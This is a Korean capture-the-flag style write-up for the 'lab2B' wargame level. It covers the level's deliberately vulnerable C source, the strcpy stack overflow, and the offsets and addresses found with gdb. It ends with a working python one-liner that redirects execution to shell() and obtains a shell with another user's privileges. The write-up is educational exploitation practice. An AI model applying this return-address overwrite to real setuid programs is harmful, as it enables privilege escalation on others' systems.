## 1. 문제 확인
- ID : lab2B
- Target : /level/lab02/lab2B
- flag : /home/lab2A/.pass
```
	lab2B@warzone:/levels/lab02$ ./lab2B
	usage:
	./lab2B string
	lab2B@warzone:/levels/lab02$ ./lab2B g4nzzi
	Hello g4nzzi
	lab2B@warzone:/levels/lab02$
```

<br/><br/>
## 2. 취약점 분석
### 2.1 Source Code
```c
	#include <stdlib.h>
	#include <stdio.h>
	#include <string.h>

	/*
 	* compiled with:
 	* gcc -O0 -fno-stack-protector lab2B.c -o lab2B
 	*/

	char* exec_string = "/bin/sh";

	void shell(char* cmd)
	{
    	system(cmd);
	}

	void print_name(char* input)
	{
    	char buf[15];
        strcpy(buf, input);
        printf("Hello %s\n", buf);
	}

	int main(int argc, char** argv)
	{
        if(argc != 2)
        {
            printf("usage:\n%s string\n", argv[0]);
            return EXIT_FAILURE;
        }

        print_name(argv[1]);

        return EXIT_SUCCESS;
	}
```
### 2.2 Code 분석
- 실행 인자값(argv)이 1개일 경우, main()함수에서 print_name(argv[1])함수를 호출함
```c
	int main(int argc, char** argv)
	{
        if(argc != 2)
        {
 		...
        }

        print_name(argv[1]);
    }
```
- print_name()함수에서 strcpy()함수로 실행 인자값(input)을 buf에 복사할 때 overflow 취약점 존재 
```c
	void print_name(char* input)
	{
    	char buf[15];
        strcpy(buf, input);
        ...
	}
```
- buf를 이용해 stack 메모리를 덮어쓰면, print_name()함수를 끝내고 main()함수로 돌아갈 주소를 shell()함수 주소로 변경 가능
```
	[XXXXXXXXXXXXXXX] [SFP] [RET]
           buf              main() <-- shell() 주소로 변경
```
- shell()함수에 exec_string값을 인자값으로 전달하면 "/bin/sh"로 system()함수를 호출하여 쉘 획득
```
	[XXXXXXXXXXXXXXX] [SFP]  [RET]   [argv]
           buf               main() 
                               ^         ^ 
                               |         |
                            shell()  exec_string
```

<br/><br/>
## 3. Exploit
- main()함수 리턴주소 위치를 계산해보니 실행 인자값(input)에서 27byte 떨어진 위치에 있음
```
	gdb-peda$ r AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
	Starting program: /levels/lab02/lab2B AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
    ...
	Stopped reason: SIGSEGV
	0x48484847 in ?? ()
```
```
	AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII
                               ^
               (27byte)        |
``` 
- 해당 위치에 shell()함수 주소값, 복귀 주소값, exec_string 주소값이 덮어써지도록 하면 됨
  (복귀 주소는 shell() 호출 이후 복귀할 주소를 뜻하므로 임의로 4byte 채워주면 됨)
```
    [XXXXXXXXXXXXXXXXXXXXXXX] [SFP]   [RET]    [RET]   [argv]
           buf + dummy                main() 
            (23byte)         (4byte) (4byte)  (4byte)  (4byte)
                                        |        |        |
                                     shell()  복귀 주소  exec_string
```
- 전역변수인 exec_string 값 "/bin/sh"의 주소는 0x80487d0 이고 shell()함수의 주소는 0x80486bd
```
	gdb-peda$ find "/bin/sh"
	Searching for '/bin/sh' in: None ranges
	Found 3 results, display max 3 items:
	lab2B : 0x80487d0 ("/bin/sh")
	lab2B : 0x80497d0 ("/bin/sh")
	 libc : 0xb7f83a24 ("/bin/sh")
```
```
	gdb-peda$ p shell
	$1 = {<text variable, no debug info>} 0x80486bd <shell>
```
- 실행 인자값으로 아래와 같이 입력하면 강제로 shell()함수 호출 후 쉘이 획득됨
```
	lab2B@warzone:/levels/lab02$ ./lab2B $(python -c 'print "A"*27+"\xbd\x86\x04\x08" + "BBBB" + "\xd0\x87\x04\x08"')
	Hello AAAAAAAAAAAAAAAAAAAAAAAAAAA▒BBBBЇ
	$ id
		uid=1007(lab2B) gid=1008(lab2B) euid=1008(lab2A) groups=1009(lab2A),1001(gameuser),1008(lab2B)
	$
```
